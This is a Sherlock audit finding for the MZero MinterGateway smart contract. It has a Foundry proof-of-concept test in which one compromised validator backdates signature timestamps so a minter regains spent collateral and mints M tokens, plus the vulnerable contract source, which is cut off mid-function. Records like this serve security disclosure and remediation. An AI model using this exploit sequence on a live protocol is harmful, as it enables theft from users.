{
  "Title": "M-3: Validator threshold can be bypassed: a single compromised validator can update minter's state to historical state",
  "Content": "# Issue M-3: Validator threshold can be bypassed: a single compromised validator can update minter's state to historical state \n\nSource: https://github.com/sherlock-audit/2023-10-mzero-judging/issues/46 \n\n## Found by \n00001111x0, pkqs90, xiaoming90\n## Summary\n\nThe `updateCollateralValidatorThreshold` specifies the minimum number of validators needed to confirm the validity of `updateCollateral` data. However, just **one** compromised validator is enough to alter a minter's collateral status. In particular, this vulnerability allows the compromised validator to set the minter's state back to a historical state, allowing malicious minters to increase their collateral.\n\n## Vulnerability Detail\n\nThe `updateCollateral()` function calls the `_verifyValidatorSignatures()` function, which calculates the minimum timestamp signed by all validators. This timestamp is then used to update the minter state's `_minterStates[minter_].updateTimestamp`. The constraint during this process is that the `_minterStates[minter_].updateTimestamp` must always be increasing.\n\nFunction `updateCollateral()`:\n```solidity\n        minTimestamp_ = _verifyValidatorSignatures(\n            msg.sender,\n            collateral_,\n            retrievalIds_,\n            metadataHash_,\n            validators_,\n            timestamps_,\n            signatures_\n        );\n        ...\n        _updateCollateral(msg.sender, safeCollateral_, minTimestamp_);\n        ...\n\n```\n\nFunction `_updateCollateral()`:\n```solidity\n    function _updateCollateral(address minter_, uint240 amount_, uint40 newTimestamp_) internal {\n        uint40 lastUpdateTimestamp_ = _minterStates[minter_].updateTimestamp;\n\n        // MinterGateway already has more recent collateral update\n        if (newTimestamp_ <= lastUpdateTimestamp_) revert StaleCollateralUpdate(newTimestamp_, lastUpdateTimestamp_);\n\n        _minterStates[minter_].collateral = amount_;\n        _minterStates[minter_].updateTimestamp = newTimestamp_;\n    }\n```\n\nIf we have 1 compromised validator, its signature can be manipulated to any chosen timestamp. Consequently, this allows for control over the timestamp in `_minterStates[minter_].updateTimestamp` making it possible to update the minter's state to a historical state. An example is given in the following proof of concept. The key here is that even though `updateCollateralValidatorThreshold` may be set to 2 or even 3, as long as 1 validator is compromised, the attack vector would work, thus defeating the purpose of having a validator threshold.\n\n## Proof Of Concept\n\nIn this unit test, `updateCollateralInterval` is set to 2000 (default value). The `updateCollateralValidatorThreshold` is set to 2, and the `_validator1` is compromised. Following the steps below, we show how we update minter to a historical state:\n\n0. Initial timestamp is `T0`.\n1. 100 seconds passed, the current timestamp is `T0+100`. Deposit 100e6 collateral at `T0+100`. `_validator0` signs signature at `T0+100`, and `_validator1` signs signature at `T0+1`. After `updateCollateral()`, minter state collateral = 100e6, and updateTimestamp = `T0+1`.\n2. Another 100 seconds passed, the current timestamp is `T0+200`. Propose retrieval for all collateral, and perform the retrieval offchain. `_validator0` signs signature at `T0+200`, and `_validator1` signs signature at `T0+2`. After `updateCollateral()`, minter state collateral = 0, and updateTimestamp = `T0+2`.\n3. Another 100 seconds passed, the current timestamp is `T0+300`. Reuse `_validator0` signature from step 1, it is signed on timestamp `T0+100`. `_validator1` signs collateral=100e6 at `T0+3`. After `updateCollateral()`, minter state collateral = 100e6, and updateTimestamp = `T0+3`.\n\nNow, the minter is free to perform minting actions since his state claims collateral is 100e6, even though he has already retrieved it back in step 2. The mint proposal may even be proposed between step 1 and step 2 to reduce the mintDelay the minter has to wait.\n\nAdd the following testing code to `MinterGateway.t.sol`. See more description in code comments.\n\n```solidity\n    function test_collateralStatusTimeTravelBySingleHackedValidator() external {\n        _ttgRegistrar.updateConfig(TTGRegistrarReader.UPDATE_COLLATERAL_VALIDATOR_THRESHOLD, bytes32(uint256(2)));\n\n        // Arrange validator addresses in increasing order.\n        address[] memory validators = new address[](2);\n        validators[0] = _validator2;\n        validators[1] = _validator1;\n\n        uint initialTimestamp = block.timestamp;\n        bytes[] memory cacheSignatures = new bytes[](2);\n        // 1. Deposit 100e6 collateral, and set malicious validator timestamp to `initialTimestamp+1` during `updateCollateral()`.\n        {\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory retrievalIds = new uint256[](0);\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp;\n            timestamps[1] = initialTimestamp + 1;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), block.timestamp, _validator2Pk);\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), initialTimestamp + 1, _validator1Pk);\n            cacheSignatures = signatures;\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 100e6);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 1);\n        }\n\n        // 2. Retrieve all collateral, and set malicious validator timestamp to `initialTimestamp+2` during `updateCollateral()`.\n        {\n            vm.prank(_minter1);\n            uint256 retrievalId = _minterGateway.proposeRetrieval(100e6);\n\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory newRetrievalIds = new uint256[](1);\n            newRetrievalIds[0] = retrievalId;\n\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp;\n            timestamps[1] = initialTimestamp + 2;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 0, newRetrievalIds, bytes32(0), block.timestamp, _validator2Pk);\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 0, newRetrievalIds, bytes32(0), initialTimestamp + 2, _validator1Pk);\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(0, newRetrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 0);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 2);\n        }\n\n        // 3. Reuse signature from step 1, and set malicious validator timestamp to `initialTimestamp+3` during `updateCollateral()`.\n        //    We have successfully \"travelled back in time\", and minter1's collateral is back to 100e6.\n        {\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory retrievalIds = new uint256[](0);\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp - 200;\n            timestamps[1] = initialTimestamp + 3;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = cacheSignatures[0];\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), initialTimestamp + 3, _validator1Pk);\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 100e6);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 3);\n        }\n    }\n\n```\n\n## Impact\n\nAs shown in the proof of concept, the minter can use the extra collateral to mint M tokens for free.\n\nOne may claim that during minting, the `collateralOf()` function checks for `block.timestamp < collateralExpiryTimestampOf(minter_)`, however, since during deployment `updateCollateralInterval` is set to 86400, that gives us enough time to perform the attack vector before \"fake\" collateral expires.\n\n## Code Snippet\n\n- https://github.com/MZero-Labs/protocol/blob/main/src/MinterGateway.sol#L1045-L1106\n\n## Tool used\n\nFoundary\n\n## Recommendation\n\nUse the maximum timestamp of all validators instead of minimum, or take the `threshold`-last minimum instead of the most minimum.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  compromises happens due to user mistake which is invalid according to sherlock rules and also; the validator has the power to update the minter state including mint request.\n\n\n\n**deluca-mike**\n\nThis is a great catch! Please reopen this as it is the most clear issue that demonstrates the issue in the simplest/purest form. The others may be duplicates if this (albeit less valid, clear, or event incorrect).\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/MZero-Labs/protocol/pull/163\n\n\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/124",
  "Code": [
    {
      "filename": "src/MinterGateway.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity 0.8.23;\n\nimport { SignatureChecker } from \"../lib/common/src/libs/SignatureChecker.sol\";\n\nimport { ERC712Extended } from \"../lib/common/src/ERC712Extended.sol\";\nimport { UIntMath } from \"../lib/common/src/libs/UIntMath.sol\";\n\nimport { TTGRegistrarReader } from \"./libs/TTGRegistrarReader.sol\";\n\nimport { IContinuousIndexing } from \"./interfaces/IContinuousIndexing.sol\";\nimport { IMToken } from \"./interfaces/IMToken.sol\";\nimport { IMinterGateway } from \"./interfaces/IMinterGateway.sol\";\nimport { IRateModel } from \"./interfaces/IRateModel.sol\";\n\nimport { ContinuousIndexing } from \"./abstract/ContinuousIndexing.sol\";\nimport { ContinuousIndexingMath } from \"./libs/ContinuousIndexingMath.sol\";\n\n/*\n\n███╗   ███╗██╗███╗   ██╗████████╗███████╗██████╗      ██████╗  █████╗ ████████╗███████╗██╗    ██╗ █████╗ ██╗   ██╗\n████╗ ████║██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝██║    ██║██╔══██╗╚██╗ ██╔╝\n██╔████╔██║██║██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║  ███╗███████║   ██║   █████╗  ██║ █╗ ██║███████║ ╚████╔╝\n██║╚██╔╝██║██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║   ██║██╔══██║   ██║   ██╔══╝  ██║███╗██║██╔══██║  ╚██╔╝\n██║ ╚═╝ ██║██║██║ ╚████║   ██║   ███████╗██║  ██║    ╚██████╔╝██║  ██║   ██║   ███████╗╚███╔███╔╝██║  ██║   ██║\n╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝\n\n-->> Where money is born. <<--\n\n*/\n\n/**\n * @title  MinterGateway\n * @author M^0 Labs\n * @notice Minting Gateway of M Token for all approved by TTG and activated minters.\n */\ncontract MinterGateway is IMinterGateway, ContinuousIndexing, ERC712Extended {\n    /* ============ Structs ============ */\n\n    /**\n     * @notice Mint proposal struct.\n     * @param  id          The unique ID of the mint proposal.\n     * @param  createdAt   The timestamp at which the mint proposal was created.\n     * @param  destination The address to mint M to.\n     * @param  amount      The amount of M to mint.\n     */\n    struct MintProposal {\n        // 1st slot\n        uint48 id;\n        uint40 createdAt;\n        address destination;\n        // 2nd slot\n        uint240 amount;\n    }\n\n    /**\n     * @notice Minter state struct.\n     * @param  isActive                Whether the minter is active or not.\n     * @param  isDeactivated           Whether the minter is deactivated or not.\n     * @param  collateral              The amount of collateral the minter has.\n     * @param  totalPendingRetrievals  The total amount of pending retrievals.\n     * @param  updateTimestamp         The timestamp at which the minter last updated their collateral.\n     * @param  penalizedUntilTimestamp The timestamp until which the minter is penalized.\n     * @param  frozenUntilTimestamp    The timestamp until which the minter is frozen.\n     * @param  latestProposedRetrievalTimestamp The timestamp at which the minter last proposed a retrieval.\n     */\n    struct MinterState {\n        // 1st slot\n        bool isActive;\n        bool isDeactivated;\n        uint240 collateral;\n        // 2nd slot\n        uint240 totalPendingRetrievals;\n        // 3rd slot\n        uint40 updateTimestamp;\n        uint40 penalizedUntilTimestamp;\n        uint40 frozenUntilTimestamp;\n        uint40 latestProposedRetrievalTimestamp;\n    }\n\n    /* ============ Variables ============ */\n\n    /// @inheritdoc IMinterGateway\n    uint16 public constant ONE = 10_000;\n\n    /// @inheritdoc IMinterGateway\n    uint32 public constant MAX_MINT_RATIO = 65_000;\n\n    /// @notice IMinterGateway\n    uint32 public constant MIN_UPDATE_COLLATERAL_INTERVAL = 3_600;\n\n    // solhint-disable-next-line max-line-length\n    /// @dev keccak256(\"UpdateCollateral(address minter,uint256 collateral,uint256[] retrievalIds,bytes32 metadataHash,uint256 timestamp)\")\n    /// @inheritdoc IMinterGateway\n    bytes32 public constant UPDATE_COLLATERAL_TYPEHASH =\n        0x22b57ca54bd15c6234b29e87aa1d76a0841b6e65e63d7acacef989de0bc3ff9e;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable ttgRegistrar;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable ttgVault;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable mToken;\n\n    /// @inheritdoc IMinterGateway\n    uint240 public totalInactiveOwedM;\n\n    /// @inheritdoc IMinterGateway\n    uint112 public principalOfTotalActiveOwedM;\n\n    /// @dev Nonce used to generate unique mint proposal IDs.\n    uint48 internal _mintNonce;\n\n    /// @dev Nonce used to generate unique retrieval proposal IDs.\n    uint48 internal _retrievalNonce;\n\n    /// @dev The state of each minter, their collaterals, relevant timestamps, and total pending retrievals.\n    mapping(address minter => MinterState state) internal _minterStates;\n\n    /// @dev The mint proposals of minter (mint ID, creation timestamp, destination, amount).\n    mapping(address minter => MintProposal proposal) internal _mintProposals;\n\n    /// @dev The owed M of active and inactive minters (principal of active, inactive).\n    mapping(address minter => uint240 rawOwedM) internal _rawOwedM;\n\n    /// @dev The pending collateral retrievals of minter (retrieval ID, amount).\n    mapping(address minter => mapping(uint48 retrievalId => uint240 amount)) internal _pendingCollateralRetrievals;\n\n    /// @dev The last update signature timestamp of each validator for each minter.\n    mapping(address minter => mapping(address validator => uint256 timestamp)) internal _lastSignatureTimestamp;\n\n    /* ============ Modifiers ============ */\n\n    /**\n     * @notice Only allow active minter to call function.\n     * @param  minter_ The address of the minter to check.\n     */\n    modifier onlyActiveMinter(address minter_) {\n        _revertIfInactiveMinter(minter_);\n\n        _;\n    }\n\n    /// @notice Only allow approved validator in TTG to call function.\n    modifier onlyApprovedValidator() {\n        _revertIfNotApprovedValidator(msg.sender);\n\n        _;\n    }\n\n    /// @notice Only allow unfrozen minter to call function.\n    modifier onlyUnfrozenMinter() {\n        _revertIfFrozenMinter(msg.sender);\n\n        _;\n    }\n\n    /* ============ Constructor ============ */\n\n    /**\n     * @notice Constructor.\n     * @param  ttgRegistrar_ The address of the TTG Registrar contract.\n     * @param  mToken_        The address of the M Token.\n     */\n    constructor(address ttgRegistrar_, address mToken_) ContinuousIndexing() ERC712Extended(\"MinterGateway\") {\n        if ((ttgRegistrar = ttgRegistrar_) == address(0)) revert ZeroTTGRegistrar();\n        if ((ttgVault = TTGRegistrarReader.getVault(ttgRegistrar_)) == address(0)) revert ZeroTTGVault();\n        if ((mToken = mToken_) == address(0)) revert ZeroMToken();\n    }\n\n    /* ============ Interactive Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateral(\n        uint256 collateral_,\n        uint256[] calldata retrievalIds_,\n        bytes32 metadataHash_,\n        address[] calldata validators_,\n        uint256[] calldata timestamps_,\n        bytes[] calldata signatures_\n    ) external onlyActiveMinter(msg.sender) returns (uint40 minTimestamp_) {\n        if (validators_.length != signatures_.length || signatures_.length != timestamps_.length) {\n            revert SignatureArrayLengthsMismatch();\n        }\n\n        // Verify that enough valid signatures are provided, and get the minimum timestamp across all valid signatures.\n        minTimestamp_ = _verifyValidatorSignatures(\n            msg.sender,\n            collateral_,\n            retrievalIds_,\n            metadataHash_,\n            validators_,\n            timestamps_,\n            signatures_\n        );\n\n        _imposePenaltyIfMissedCollateralUpdates(msg.sender);\n\n        _imposePenaltyIfUndercollateralized(msg.sender, minTimestamp_);\n\n        uint240 safeCollateral_ = UIntMath.safe240(collateral_);\n        uint240 totalResolvedCollateralRetrieval_ = _resolvePendingRetrievals(msg.sender, retrievalIds_);\n\n        emit CollateralUpdated(\n            msg.sender,\n            safeCollateral_,\n            totalResolvedCollateralRetrieval_,\n            metadataHash_,\n            minTimestamp_\n        );\n\n        _updateCollateral(msg.sender, safeCollateral_, minTimestamp_);\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the collateral\n        //       update can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function proposeRetrieval(uint256 collateral_) external onlyActiveMinter(msg.sender) returns (uint48 retrievalId_) {\n        if (collateral_ == 0) revert ZeroRetrievalAmount();\n\n        unchecked {\n            retrievalId_ = ++_retrievalNonce;\n        }\n\n        MinterState storage minterState_ = _minterStates[msg.sender];\n        uint240 currentCollateral_ = minterState_.collateral;\n        uint240 safeCollateral_ = UIntMath.safe240(collateral_);\n        uint240 updatedTotalPendingRetrievals_ = minterState_.totalPendingRetrievals + safeCollateral_;\n\n        // NOTE: Revert if collateral is less than sum of all pending retrievals even if there is no owed M by minter.\n        if (currentCollateral_ < updatedTotalPendingRetrievals_) {\n            revert RetrievalsExceedCollateral(updatedTotalPendingRetrievals_, currentCollateral_);\n        }\n\n        minterState_.latestProposedRetrievalTimestamp = uint40(block.timestamp);\n        minterState_.totalPendingRetrievals = updatedTotalPendingRetrievals_;\n        _pendingCollateralRetrievals[msg.sender][retrievalId_] = safeCollateral_;\n\n        _revertIfUndercollateralized(msg.sender, 0);\n\n        emit RetrievalCreated(retrievalId_, msg.sender, safeCollateral_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function proposeMint(\n        uint256 amount_,\n        address destination_\n    ) external onlyActiveMinter(msg.sender) onlyUnfrozenMinter returns (uint48 mintId_) {\n        if (amount_ == 0) revert ZeroMintAmount();\n        if (destination_ == address(0)) revert ZeroMintDestination();\n\n        uint240 safeAmount_ = UIntMath.safe240(amount_);\n\n        _revertIfUndercollateralized(msg.sender, safeAmount_); // Ensure minter remains sufficiently collateralized.\n\n        unchecked {\n            mintId_ = ++_mintNonce;\n        }\n\n        _mintProposals[msg.sender] = MintProposal(mintId_, uint40(block.timestamp), destination_, safeAmount_);\n\n        emit MintProposed(mintId_, msg.sender, safeAmount_, destination_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintM(\n        uint256 mintId_\n    ) external onlyActiveMinter(msg.sender) onlyUnfrozenMinter returns (uint112 principalAmount_, uint240 amount_) {\n        MintProposal storage mintProposal_ = _mintProposals[msg.sender];\n\n        uint48 id_;\n        uint40 createdAt_;\n        address destination_;\n        (id_, createdAt_, destination_, amount_) = (\n            mintProposal_.id,\n            mintProposal_.createdAt,\n            mintProposal_.destination,\n            mintProposal_.amount\n        );\n\n        if (id_ != mintId_) revert InvalidMintProposal();\n\n        unchecked {\n            // Check that mint proposal is executable.\n            uint40 activeAt_ = createdAt_ + mintDelay();\n            if (block.timestamp < activeAt_) revert PendingMintProposal(activeAt_);\n\n            uint40 expiresAt_ = activeAt_ + mintTTL();\n            if (block.timestamp > expiresAt_) revert ExpiredMintProposal(expiresAt_);\n        }\n\n        _revertIfUndercollateralized(msg.sender, amount_); // Ensure minter remains sufficiently collateralized.\n\n        delete _mintProposals[msg.sender]; // Delete mint request.\n\n        // Adjust principal of active owed M for minter.\n        // NOTE: When minting a present amount, round the principal up in favor of the protocol.\n        principalAmount_ = _getPrincipalAmountRoundedUp(amount_);\n        uint112 principalOfTotalActiveOwedM_ = principalOfTotalActiveOwedM;\n\n        emit MintExecuted(id_, msg.sender, principalAmount_, amount_);\n\n        unchecked {\n            uint256 newPrincipalOfTotalActiveOwedM_ = uint256(principalOfTotalActiveOwedM_) + principalAmount_;\n\n            // As an edge case precaution, prevent a mint that, if all owed M (active and inactive) was converted to\n            // a principal active amount, would overflow the `uint112 principalOfTotalActiveOwedM`.\n            if (\n                // NOTE: Round the principal up for worst case.\n                newPrincipalOfTotalActiveOwedM_ + _getPrincipalAmountRoundedUp(totalInactiveOwedM) >= type(uint112).max\n            ) {\n                revert OverflowsPrincipalOfTotalOwedM();\n            }\n\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n            _rawOwedM[msg.sender] += principalAmount_; // Treat rawOwedM as principal since minter is active.\n        }\n\n        IMToken(mToken).mint(destination_, amount_);\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the mint\n        //       can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function burnM(address minter_, uint256 maxAmount_) external returns (uint112 principalAmount_, uint240 amount_) {\n        (principalAmount_, amount_) = burnM(\n            minter_,\n            _getPrincipalAmountRoundedDown(UIntMath.safe240(maxAmount_)),\n            maxAmount_\n        );\n    }\n\n    /// @inheritdoc IMinterGateway\n    function burnM(\n        address minter_,\n        uint256 maxPrincipalAmount_,\n        uint256 maxAmount_\n    ) public returns (uint112 principalAmount_, uint240 amount_) {\n        if (maxPrincipalAmount_ == 0 || maxAmount_ == 0) revert ZeroBurnAmount();\n\n        MinterState storage minterState_ = _minterStates[minter_];\n        bool isActive_ = minterState_.isActive;\n\n        // Revert early if minter has not been activated.\n        if (!isActive_ && !minterState_.isDeactivated) revert InactiveMinter();\n\n        if (isActive_) {\n            // NOTE: Penalize only for missed collateral updates, not for undercollateralization.\n            // Undercollateralization within one update interval is forgiven.\n            _imposePenaltyIfMissedCollateralUpdates(minter_);\n\n            (principalAmount_, amount_) = _repayForActiveMinter(\n                minter_,\n                UIntMath.safe112(maxPrincipalAmount_),\n                UIntMath.safe240(maxAmount_)\n            );\n\n            emit BurnExecuted(minter_, principalAmount_, amount_, msg.sender);\n        } else {\n            amount_ = _repayForDeactivatedMinter(minter_, UIntMath.safe240(maxAmount_));\n\n            emit BurnExecuted(minter_, amount_, msg.sender);\n        }\n\n        IMToken(mToken).burn(msg.sender, amount_); // Burn actual M tokens\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the burn\n        //       can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function cancelMint(address minter_, uint256 mintId_) external onlyApprovedValidator {\n        uint48 id_ = _mintProposals[minter_].id;\n\n        if (id_ != mintId_ || id_ == 0) revert InvalidMintProposal();\n\n        delete _mintProposals[minter_];\n\n        emit MintCanceled(id_, minter_, msg.sender);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function freezeMinter(address minter_) external onlyApprovedValidator returns (uint40 frozenUntil_) {\n        unchecked {\n            _minterStates[minter_].frozenUntilTimestamp = frozenUntil_ = uint40(block.timestamp) + minterFreezeTime();\n        }\n\n        emit MinterFrozen(minter_, frozenUntil_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function activateMinter(address minter_) external {\n        if (!isMinterApproved(minter_)) revert NotApprovedMinter();\n\n        MinterState storage minterState_ = _minterStates[minter_];\n\n        // NOTE: Once deactivated, a minter cannot be reactivated.\n        if (minterState_.isDeactivated) revert DeactivatedMinter();\n\n        minterState_.isActive = true;\n\n        emit MinterActivated(minter_, msg.sender);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function deactivateMinter(address minter_) external onlyActiveMinter(minter_) returns (uint240 inactiveOwedM_) {\n        if (isMinterApproved(minter_)) revert StillApprovedMinter();\n\n        _imposePenaltyIfMissedCollateralUpdates(minter_);\n\n        uint112 principalOfOwedM_ = principalOfActiveOwedMOf(minter_);\n\n        inactiveOwedM_ = _getPresentAmount(principalOfOwedM_);\n\n        unchecked {\n            // Treat rawOwedM as principal since minter is active.\n            principalOfTotalActiveOwedM -= principalOfOwedM_;\n            totalInactiveOwedM += inactiveOwedM_;\n        }\n\n        emit MinterDeactivated(minter_, inactiveOwedM_, msg.sender);\n\n        // Reset reasonable aspects of minter's state\n        delete _minterStates[minter_];\n        delete _mintProposals[minter_];\n\n        // Deactivate minter.\n        _minterStates[minter_].isDeactivated = true;\n\n        _rawOwedM[minter_] = inactiveOwedM_; // Treat rawOwedM as inactive owed M since minter is now inactive.\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the\n        //       deactivation can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IContinuousIndexing\n    function updateIndex() public override(IContinuousIndexing, ContinuousIndexing) returns (uint128 index_) {\n        // NOTE: Since the currentIndex of the Minter Gateway and mToken are constant through this context's execution\n        //       (the block.timestamp is not changing) we can compute excessOwedM without updating the mToken index.\n        uint240 excessOwedM_ = excessOwedM();\n\n        if (excessOwedM_ > 0) IMToken(mToken).mint(ttgVault, excessOwedM_); // Mint M to TTG Vault.\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the collateral\n        //       update can result in a new rate, we should update the index here to lock in that rate.\n        // NOTE: With the current rate models, the minter rate does not depend on anything in the Minter Gateway\n        //       or mToken, so we can update the minter rate and index here.\n        index_ = super.updateIndex(); // Update minter index and rate.\n\n        // NOTE: Given the current implementation of the mToken transfers and its rate model, while it is possible for\n        //       the above mint to already have updated the mToken index if M was minted to an earning account, we want\n        //       to ensure the rate provided by the mToken's rate model is locked in.\n        IMToken(mToken).updateIndex(); // Update earning index and rate.\n    }\n\n    /* ============ View/Pure Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function totalActiveOwedM() public view returns (uint240) {\n        return _getPresentAmount(principalOfTotalActiveOwedM);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function totalOwedM() external view returns (uint240) {\n        unchecked {\n            // NOTE: This can never overflow since the `mint` functions caps the principal of total owed M (active and\n            //       inactive) to `type(uint112).max`. Thus, there can never be enough inactive owed M (which is an\n            //       accumulations principal of active owed M values converted to present values at previous and lower\n            //       indices) or active owed M to overflow this.\n            return totalActiveOwedM() + totalInactiveOwedM;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function excessOwedM() public view returns (uint240 excessOwedM_) {\n        // NOTE: Can safely cast to `uint240` since we know M Token totalSupply constraints.\n        uint240 totalMSupply_ = uint240(IMToken(mToken).totalSupply());\n\n        uint240 totalOwedM_ = _getPresentAmountRoundedDown(principalOfTotalActiveOwedM, currentIndex()) +\n            totalInactiveOwedM;\n\n        unchecked {\n            if (totalOwedM_ > totalMSupply_) return totalOwedM_ - totalMSupply_;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function minterRate() external view returns (uint32) {\n        return _latestRate;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isActiveMinter(address minter_) external view returns (bool) {\n        return _minterStates[minter_].isActive;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isDeactivatedMinter(address minter_) external view returns (bool) {\n        return _minterStates[minter_].isDeactivated;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isFrozenMinter(address minter_) external view returns (bool) {\n        return block.timestamp < _minterStates[minter_].frozenUntilTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function principalOfActiveOwedMOf(address minter_) public view returns (uint112) {\n        // NOTE: This should also include the principal value of unavoidable penalities. But then it would be very, if\n        //       not impossible, to determine the `principalOfTotalActiveOwedM` to the same standards.\n        return\n            _minterStates[minter_].isActive\n                ? uint112(_rawOwedM[minter_]) // Treat rawOwedM as principal since minter is active.\n                : 0;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function activeOwedMOf(address minter_) public view returns (uint240) {\n        // NOTE: This should also include the present value of unavoidable penalities. But then it would be very, if\n        //       not impossible, to determine the `totalActiveOwedM` to the same standards.\n        return\n            _minterStates[minter_].isActive\n                ? _getPresentAmount(uint112(_rawOwedM[minter_])) // Treat rawOwedM as principal since minter is active.\n                : 0;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function maxAllowedActiveOwedMOf(address minter_) public view returns (uint256) {\n        // NOTE: Since `mintRatio()` is capped at 650% (i.e. 65_000) this cannot overflow.\n        unchecked {\n            return _minterStates[minter_].isActive ? (uint256(collateralOf(minter_)) * mintRatio()) / ONE : 0;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function inactiveOwedMOf(address minter_) public view returns (uint240) {\n        // Treat rawOwedM as present amount since minter is inactive.\n        return _minterStates[minter_].isActive ? 0 : _rawOwedM[minter_];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralOf(address minter_) public view returns (uint240) {\n        // If collateral was not updated by the deadline, assume that minter's collateral is zero.\n        if (block.timestamp >= collateralExpiryTimestampOf(minter_)) return 0;\n\n        MinterState storage minterState_ = _minterStates[minter_];\n        uint240 totalPendingRetrievals_ = minterState_.totalPendingRetrievals;\n        uint240 collateral_ = minterState_.collateral;\n\n        // If the minter's total pending retrievals is greater than their collateral, then their collateral is zero.\n        if (totalPendingRetrievals_ >= collateral_) return 0;\n\n        unchecked {\n            return collateral_ - totalPendingRetrievals_;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralUpdateTimestampOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].updateTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralPenaltyDeadlineOf(address minter_) external view returns (uint40) {\n        MinterState storage minterState_ = _minterStates[minter_];\n        uint32 updateCollateralInterval_ = updateCollateralInterval();\n\n        (, uint40 missedUntil_) = _getMissedCollateralUpdateParameters(\n            minterState_.updateTimestamp,\n            minterState_.penalizedUntilTimestamp,\n            updateCollateralInterval_\n        );\n\n        return missedUntil_ + updateCollateralInterval_;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralExpiryTimestampOf(address minter_) public view returns (uint40) {\n        unchecked {\n            return _minterStates[minter_].updateTimestamp + updateCollateralInterval();\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function penalizedUntilOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].penalizedUntilTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function latestProposedRetrievalTimestampOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].latestProposedRetrievalTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function getLastSignatureTimestamp(address minter_, address validator_) external view returns (uint256) {\n        return _lastSignatureTimestamp[minter_][validator_];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function 